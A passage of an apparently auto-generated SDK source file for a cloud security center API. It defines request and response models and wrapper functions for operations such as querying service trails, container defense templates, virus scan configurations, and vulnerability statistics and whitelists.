    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get Serverless Authorization Overview
 *
 * @param request GetServerlessAuthSummaryRequest
 * @return GetServerlessAuthSummaryResponse
 */
async function getServerlessAuthSummary(request: GetServerlessAuthSummaryRequest): GetServerlessAuthSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getServerlessAuthSummaryWithOptions(request, runtime);
}

model GetServiceTrailRequest {
  regionId?: string(name='RegionId', description='The ID of the region in which the instance resides. Valid value:

*   **cn-hangzhou**: center.
*   **ap-southeast-1**: Singapore.', example='cn-hangzhou'),
}

model GetServiceTrailResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
  serviceTrail?: {
    config?: string(name='Config', description='The status of the service trail. Valid values:

*   **on:**
*   **off:**', example='on'),
    createTime?: long(name='CreateTime', description='The timestamp generated when the service trail was created. Unit: milliseconds.', example='1687250241000'),
    updateTime?: long(name='UpdateTime', description='The timestamp generated when the service trail was last updated. Unit: milliseconds.', example='1687250241000'),
  }(name='ServiceTrail', description='The configurations of the service trail.'),
}

model GetServiceTrailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetServiceTrailResponseBody(name='body'),
}

/**
 * @summary Queries the service trail that was delivered to ActionTrail.
 *
 * @param request GetServiceTrailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetServiceTrailResponse
 */
async function getServiceTrailWithOptions(request: GetServiceTrailRequest, runtime: Util.RuntimeOptions): GetServiceTrailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetServiceTrail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the service trail that was delivered to ActionTrail.
 *
 * @param request GetServiceTrailRequest
 * @return GetServiceTrailResponse
 */
async function getServiceTrail(request: GetServiceTrailRequest): GetServiceTrailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getServiceTrailWithOptions(request, runtime);
}

model GetStrategyTemplateDetailRequest {
  strategyId?: long(name='StrategyId', description='The ID of the template.

>  You can call the [GetOpaStrategyTemplateSummary](~~GetOpaStrategyTemplateSummary~~) operation to query the IDs of templates.', example='2'),
}

model GetStrategyTemplateDetailResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    alarmDetail?: {
      baseline?: {
        item?: [ 
          {
            id?: string(name='Id', description='The unique identifier of the baseline check item.', example='ak_leak'),
            name?: string(name='Name', description='The name of the baseline check item.', example='Access Key plaintext storage'),
          }
        ](name='Item', description='The baseline items.'),
        riskLevel?: [ string ](name='RiskLevel', description='The severities of the baselines. Valid values:

*   **high**
*   **medium**
*   **low**'),
      }(name='Baseline', description='The configuration of the baseline.'),
      maliciousFile?: {
        item?: [ 
          {
            id?: string(name='Id', description='The unique identifier of the malicious sample.', example='test'),
            name?: string(name='Name', description='The name of the malicious sample.', example='test'),
          }
        ](name='Item', description='The items on which malicious samples are detected.'),
        riskLevel?: [ string ](name='RiskLevel', description='The severities of the malicious samples.'),
      }(name='MaliciousFile', description='The configuration of the alert rule for the malicious sample.'),
      vul?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the vulnerability.', example='AVD-2023-1680169'),
            name?: string(name='Name', description='The alias of the vulnerability.', example='ezOffice evoInterfaceServlet Info Leak'),
          }
        ](name='Item', description='The items on which vulnerabilities are detected.'),
        riskLevel?: [ string ](name='RiskLevel', description='The severities of the vulnerabilities.'),
      }(name='Vul', description='The configuration of the vulnerability detection rule.'),
    }(name='AlarmDetail', description='The configuration of the rule.'),
    clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='hhht-cluster-02'),
    description?: string(name='Description', description='The description of the rule.', example='Custom defense configuration'),
    imageName?: [ string ](name='ImageName', description='The names of images.'),
    label?: [ string ](name='Label', description='The tags that are added to the containers.'),
    maliciousImage?: boolean(name='MaliciousImage', description='Indicates whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='false'),
    namespace?: [ string ](name='Namespace', description='The namespaces.'),
    ruleAction?: int32(name='RuleAction', description='The action on requests. Valid values:

*   **1**: trigger alerts
*   **2**: block
*   **3**: allow', example='1'),
    strategyId?: long(name='StrategyId', description='The ID of the rule.', example='1005'),
    strategyName?: string(name='StrategyName', description='The name of the rule.', example='Blank template'),
    strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the template.', example='1204'),
    unScanedImage?: boolean(name='UnScanedImage', description='Indicates whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='false'),
    whiteList?: [ string ](name='WhiteList', description='The whitelists of tags that are added to images.'),
  }(name='Data', description='The details of the template.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='1E36BEEA-0B27-58CC-8319-50279203B048'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetStrategyTemplateDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetStrategyTemplateDetailResponseBody(name='body'),
}

/**
 * @summary Queries the usage details of templates provided in the feature of proactive defense for containers for rules.
 *
 * @param request GetStrategyTemplateDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetStrategyTemplateDetailResponse
 */
async function getStrategyTemplateDetailWithOptions(request: GetStrategyTemplateDetailRequest, runtime: Util.RuntimeOptions): GetStrategyTemplateDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetStrategyTemplateDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the usage details of templates provided in the feature of proactive defense for containers for rules.
 *
 * @param request GetStrategyTemplateDetailRequest
 * @return GetStrategyTemplateDetailResponse
 */
async function getStrategyTemplateDetail(request: GetStrategyTemplateDetailRequest): GetStrategyTemplateDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getStrategyTemplateDetailWithOptions(request, runtime);
}

model GetSupportedModulesRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model GetSupportedModulesResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
  supportedModuleResponse?: [ 
    {
      supportedModules?: [ 
        {
          module?: string(name='Module', description='The code of the module. Valid values:

*   **HOST**: host
*   **CSPM**: configuration assessment
*   **SIEM**: CloudSiem
*   **TRIAL**: log audit', example='HOST'),
          moduleDisp?: string(name='ModuleDisp', description='The display name of the module.', example='Configuration assessment'),
        }
      ](name='SupportedModules', description='The modules supported by the cloud service provider.'),
      vendor?: string(name='Vendor', description='The cloud service provider. Valid values:

*   **Tencent**: Tencent Cloud
*   **HUAWEICLOUD**:Huawei Cloud
*   **Azure**: Microsoft Azure
*   **AWS**: Amazon Web Services (AWS)', example='Tencent'),
    }
  ](name='SupportedModuleResponse', description='The supported modules. The module information is classified by cloud service provider.'),
}

model GetSupportedModulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSupportedModulesResponseBody(name='body'),
}

/**
 * @summary 获取授权支持的模块列表
 *
 * @param request GetSupportedModulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSupportedModulesResponse
 */
async function getSupportedModulesWithOptions(request: GetSupportedModulesRequest, runtime: Util.RuntimeOptions): GetSupportedModulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSupportedModules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 获取授权支持的模块列表
 *
 * @param request GetSupportedModulesRequest
 * @return GetSupportedModulesResponse
 */
async function getSupportedModules(request: GetSupportedModulesRequest): GetSupportedModulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSupportedModulesWithOptions(request, runtime);
}

model GetSuspiciousStatisticsRequest {
  groupIdList?: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,).

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.

This parameter is required.', example='9997897'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
}

model GetSuspiciousStatisticsResponseBody = {
  remindCount?: int32(name='RemindCount', description='The number of alerts whose Emergency level is Reminder.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='84092B42-1A59-4F34-8DF8-1D93520990A5'),
  seriousCount?: int32(name='SeriousCount', description='The number of alerts whose Emergency level is Urgent.', example='1'),
  suspiciousCount?: int32(name='SuspiciousCount', description='The number of alerts whose Emergency level is Suspicious.', example='8'),
  totalCount?: int32(name='TotalCount', description='The total number of alerts.', example='9'),
}

model GetSuspiciousStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSuspiciousStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on alerts in one or more asset groups.
 *
 * @param request GetSuspiciousStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSuspiciousStatisticsResponse
 */
async function getSuspiciousStatisticsWithOptions(request: GetSuspiciousStatisticsRequest, runtime: Util.RuntimeOptions): GetSuspiciousStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSuspiciousStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on alerts in one or more asset groups.
 *
 * @param request GetSuspiciousStatisticsRequest
 * @return GetSuspiciousStatisticsResponse
 */
async function getSuspiciousStatistics(request: GetSuspiciousStatisticsRequest): GetSuspiciousStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSuspiciousStatisticsWithOptions(request, runtime);
}

model GetSwitchRegionDetailRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  type?: string(name='Type', description='The type of the migration operation. Valid values:

*   **sg_switch**: the migration of a server from a region in the Chinese mainland to the Singapore region.
*   **sls_meta_version_switch_stage_1**: the upgrade of log dictionaries.', example='sg_switch'),
}

model GetSwitchRegionDetailResponseBody = {
  data?: {
    gmtIsAgreeModified?: long(name='GmtIsAgreeModified', description='The time when the permissions were modified.', example='1692858597000'),
    gmtNoticed?: long(name='GmtNoticed', description='The notification time.', example='1692858597000'),
    isAgree?: string(name='IsAgree', description='Indicates whether the migration is approved.', example='true'),
    isNoticed?: string(name='IsNoticed', description='Indicates whether the notification is sent.', example='YES'),
    regionStatus?: [ 
      {
        ecsCount?: int32(name='EcsCount', description='The number of ECS instances.', example='27'),
        gmtPlanSwitchTime?: long(name='GmtPlanSwitchTime', description='The time when the migration is scheduled.', example='1692858597000'),
        regionId?: string(name='RegionId', description='The region in which the server resides.', example='us-east-1'),
        status?: int32(name='Status', description='The migration status. Valid values:

*   **0**: pending
*   **1**: successful', example='0'),
      }
    ](name='RegionStatus', description='The status of the switching to the region.'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model GetSwitchRegionDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSwitchRegionDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of a migration operation. For example, you can query the progress and status of a migration operation after you migrate a server from a region in the Chinese mainland to the Singapore region.
 *
 * @param request GetSwitchRegionDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSwitchRegionDetailResponse
 */
async function getSwitchRegionDetailWithOptions(request: GetSwitchRegionDetailRequest, runtime: Util.RuntimeOptions): GetSwitchRegionDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSwitchRegionDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a migration operation. For example, you can query the progress and status of a migration operation after you migrate a server from a region in the Chinese mainland to the Singapore region.
 *
 * @param request GetSwitchRegionDetailRequest
 * @return GetSwitchRegionDetailResponse
 */
async function getSwitchRegionDetail(request: GetSwitchRegionDetailRequest): GetSwitchRegionDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSwitchRegionDetailWithOptions(request, runtime);
}

model GetTenantCheckAvailableResponseBody = {
  data?: {
    nextScanTime?: long(name='NextScanTime', description='The timestamp when you can submit a quick scan task.', example='1725530005357'),
    status?: int32(name='Status', description='The status of the quick scan task. Enumerated values:

*   0: You can submit a quick scan task.
*   1: The current task is not complete. You cannot submit a quick scan task.
*   2: The free quota for this week is exhausted. You must wait for the next free scan period.', example='0'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='69BFFCDE-37D6-5A49-A8BC-BB03AC83****'),
}

model GetTenantCheckAvailableResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetTenantCheckAvailableResponseBody(name='body'),
}

/**
 * @summary Checks whether you can submit a free quick scan task, which includes vulnerability detection in the free category and free check items of Cloud Security Posture Management (CSPM).
 *
 * @param request GetTenantCheckAvailableRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetTenantCheckAvailableResponse
 */
async function getTenantCheckAvailableWithOptions(runtime: Util.RuntimeOptions): GetTenantCheckAvailableResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetTenantCheckAvailable',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether you can submit a free quick scan task, which includes vulnerability detection in the free category and free check items of Cloud Security Posture Management (CSPM).
 *
 * @return GetTenantCheckAvailableResponse
 */
async function getTenantCheckAvailable(): GetTenantCheckAvailableResponse {
  var runtime = new Util.RuntimeOptions{};
  return getTenantCheckAvailableWithOptions(runtime);
}

model GetUserLangResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='23AD0BD2-8771-5647-819E-6BA51E21****'),
  sasUserLang?: {
    lang?: string(name='Lang', description='The language specified for log analysis. Valid values:

*   zh: Chinese
*   en: English', example='zh'),
  }(name='SasUserLang', description='The language settings.'),
}

model GetUserLangResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetUserLangResponseBody(name='body'),
}

/**
 * @summary Queries the language settings of log analysis.
 *
 * @param request GetUserLangRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetUserLangResponse
 */
async function getUserLangWithOptions(runtime: Util.RuntimeOptions): GetUserLangResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetUserLang',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the language settings of log analysis.
 *
 * @return GetUserLangResponse
 */
async function getUserLang(): GetUserLangResponse {
  var runtime = new Util.RuntimeOptions{};
  return getUserLangWithOptions(runtime);
}

model GetVirusScanConfigRequest {
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: a virus scan task.', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model GetVirusScanConfigResponseBody = {
  data?: {
    configId?: string(name='ConfigId', description='The ID of the task configuration.

> You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.', example='97a1fed216908e417407344e1505xxxx'),
    enable?: int32(name='Enable', description='Indicates whether the periodic scan feature is enabled. Valid value:

*   **1**: The feature is enabled
*   **0**: The feature is disabled.', example='1'),
    intervalPeriod?: int32(name='IntervalPeriod', description='The interval at which virus scan tasks are run.', example='7'),
    periodUnit?: string(name='PeriodUnit', description='The unit of the interval at which virus scan tasks are run.

*   The value is fixed as **day**.', example='day'),
    scanPath?: [ string ](name='ScanPath', description='The file paths.'),
    scanType?: string(name='ScanType', description='The type of the virus scan task. Valid values:

*   **system**: automatic scan.
*   **user**: custom scan.', example='user'),
    selectionKey?: string(name='SelectionKey', description='The key that stores the asset information.

> You can call the [GetAssetSelectionConfig](~~GetAssetSelectionConfig~~) operation to obtain the key value.', example='345ddbea-a57f-437e-832f-fb7a1202xxxx'),
    targetEndTime?: int32(name='TargetEndTime', description='The end time of the virus scan task. The time is a time frame.', example='6'),
    targetStartTime?: int32(name='TargetStartTime', description='The start time of the virus scan task. The time is a time frame.', example='0'),
    taskType?: string(name='TaskType', description='The type of the task. Valid value:

*   **VIRUS_VUL_SCHEDULE_SCAN**: a virus scan task.', example='VIRUS_VUL_SCHEDULE_SCAN'),
  }(name='Data', description='The data returned if the request was successful.'),
  requestId?: string(name='RequestId', description='The request ID.', example='028CF634-5268-5660-9575-48C9ED6BDEFC'),
}

model GetVirusScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetVirusScanConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of a periodic virus scan task.
 *
 * @param request GetVirusScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetVirusScanConfigResponse
 */
async function getVirusScanConfigWithOptions(request: GetVirusScanConfigRequest, runtime: Util.RuntimeOptions): GetVirusScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVirusScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of a periodic virus scan task.
 *
 * @param request GetVirusScanConfigRequest
 * @return GetVirusScanConfigResponse
 */
async function getVirusScanConfig(request: GetVirusScanConfigRequest): GetVirusScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVirusScanConfigWithOptions(request, runtime);
}

model GetVirusScanLatestTaskStatisticResponseBody = {
  data?: {
    completeMachine?: int32(name='CompleteMachine', description='The number of machines on which the virus scan task is complete.', example='2'),
    machineName?: string(name='MachineName', description='The name of the machine.', example='testMahine1'),
    progress?: string(name='Progress', description='The progress of the virus scan task in percentage.', example='92'),
    riskLevel?: string(name='RiskLevel', description='The highest risk level of the detected alerts. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
    safeMachine?: int32(name='SafeMachine', description='The number of safe machines that are detected.', example='1'),
    scanMachine?: int32(name='ScanMachine', description='The number of machines that are scanned.', example='3'),
    scanPath?: [ string ](name='ScanPath', description='The paths of files that were scanned. This value is returned only when ScanType is set to user.'),
    scanTime?: long(name='ScanTime', description='The timestamp generated when the virus scan task was performed. Unit: milliseconds.', example='1681145862000'),
    scanType?: string(name='ScanType', description='The type of the virus scan. Valid values:

*   **system**: automatic scan.
*   **user**: custom scan.', example='system'),
    status?: int32(name='Status', description='The status of the virus scan task.

**Valid values for a main task**:

*   **0**: The main task is to be started.
*   **10**: The main task is running.
*   **100**: The main task is complete.

**Valid values for a subtask**:

*   **0**: The subtask is to be started.
*   **20**: The scan script is sent.
*   **50**: The subtask is running.
*   **100**: The subtask is complete.', example='0'),
    suspiciousCount?: int32(name='SuspiciousCount', description='The number of alerts that are detected.', example='2'),
    suspiciousMachine?: int32(name='SuspiciousMachine', description='The number of suspicious machines that are detected.', example='2'),
    taskId?: string(name='TaskId', description='The ID of the virus scan task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    unCompleteMachine?: int32(name='UnCompleteMachine', description='The number of machines on which the virus scan task was not complete or failed.', example='1'),
  }(name='Data', description='The information about the virus scan task.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model GetVirusScanLatestTaskStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetVirusScanLatestTaskStatisticResponseBody(name='body'),
}

/**
 * @summary Queries the information about the latest virus scan task.
 *
 * @param request GetVirusScanLatestTaskStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetVirusScanLatestTaskStatisticResponse
 */
async function getVirusScanLatestTaskStatisticWithOptions(runtime: Util.RuntimeOptions): GetVirusScanLatestTaskStatisticResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetVirusScanLatestTaskStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the latest virus scan task.
 *
 * @return GetVirusScanLatestTaskStatisticResponse
 */
async function getVirusScanLatestTaskStatistic(): GetVirusScanLatestTaskStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVirusScanLatestTaskStatisticWithOptions(runtime);
}

model GetVulStatisticsRequest {
  groupIdList?: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,).

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.

This parameter is required.', example='9997897'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
  typeList?: string(name='TypeList', description='The type of the vulnerability whose statistics you want to query. Separate multiple types with commas (,). Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: vulnerability detected by using a web scanner
*   **sca**: vulnerability detected based on software component analysis

This parameter is required.', example='cve'),
}

model GetVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3FE272FA-7263-4554-A90F-A7857945A6D5'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities that have the high priority.', example='16'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities that have the medium priority.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of vulnerabilities that have the low priority.', example='0'),
}

model GetVulStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetVulStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on vulnerabilities in asset groups.
 *
 * @param request GetVulStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetVulStatisticsResponse
 */
async function getVulStatisticsWithOptions(request: GetVulStatisticsRequest, runtime: Util.RuntimeOptions): GetVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on vulnerabilities in asset groups.
 *
 * @param request GetVulStatisticsRequest
 * @return GetVulStatisticsResponse
 */
async function getVulStatistics(request: GetVulStatisticsRequest): GetVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulStatisticsWithOptions(request, runtime);
}

model GetVulWhitelistRequest {
  vulWhitelistId?: long(name='VulWhitelistId', description='The ID of the whitelist.', example='1275'),
}

model GetVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  vulWhitelist?: {
    aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
    id?: long(name='Id', description='The ID of the whitelist.', example='1275'),
    name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
    reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='Ignore'),
    target?: string(name='Target', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the ID of the server group

*   **uuids**: the UUID of the server

> If this parameter is empty, the rule is applied to all types of assets.', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
    type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
    whitelist?: string(name='Whitelist', description='The information about the vulnerability that is added to the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerabilities

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
  }(name='VulWhitelist', description='The information about the whitelist.'),
}

model GetVulWhitelistResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetVulWhitelistResponseBody(name='body'),
}

/**
 * @summary Queries information about a vulnerability whitelist.
 *
 * @param request GetVulWhitelistRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetVulWhitelistResponse
 */
async function getVulWhitelistWithOptions(request: GetVulWhitelistRequest, runtime: Util.RuntimeOptions): GetVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vulWhitelistId)) {
    query['VulWhitelistId'] = request.vulWhitelistId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
